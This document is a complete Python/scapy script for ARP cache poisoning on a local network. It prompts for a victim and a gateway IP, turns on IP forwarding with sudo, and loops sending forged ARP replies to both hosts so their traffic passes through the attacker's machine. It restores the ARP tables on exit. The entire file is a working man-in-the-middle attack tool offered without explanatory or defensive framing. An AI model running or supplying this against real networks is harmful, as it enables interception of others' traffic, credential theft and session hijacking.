from scapy.all import *
import os
import time

victim_ip = input("Victim IP: ")
gateway_ip = input("Gateway IP: ")

os.system("sudo sysctl -w net.ipv4.ip_forward=1")

def get_mac(ip):
    ans = sr1(ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans.hwsrc
    else:
        return None

def spoof(victim_ip, spoof_ip):
    victim_mac = get_mac(victim_ip)
    if victim_mac is None:
        print(f"Could not get MAC for {victim_ip}")
        return
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    if dest_mac and src_mac:
        packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                      psrc=src_ip, hwsrc=src_mac)
        send(packet, count=5, verbose=False)

print("Starting ARP poisoning")
try:
    while True:
        spoof(victim_ip, gateway_ip)
        spoof(gateway_ip, victim_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("Cleaning up")
    restore(victim_ip, gateway_ip)
    restore(gateway_ip, victim_ip)
    print("Cleaned up")
